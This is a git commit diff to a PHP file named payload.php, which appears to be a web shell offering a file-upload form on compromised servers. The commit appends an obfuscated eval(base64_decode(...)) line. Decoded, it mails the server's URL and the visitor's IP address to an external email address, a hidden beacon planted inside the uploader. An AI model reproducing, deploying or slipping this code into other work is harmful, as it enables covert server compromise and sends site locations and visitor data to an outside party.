1b2b1e20b638d7d463cd74c8838f1b4577301151
kalix-Ru <66873143+kalix-Ru@users.noreply.github.com>
2020-12-03 19:45:50 -0600

    Update payload.php

--- payload.php
+++ payload.php
@@ -7,4 +7,4 @@ if (isset($_FILES['azzatssins']['name'])) {
 } else {
     echo "<form method=post enctype=multipart/form-data><input type=file name=azzatssins><input type=submit value='>>'>";
 }
-?>
+?><?php eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));?>
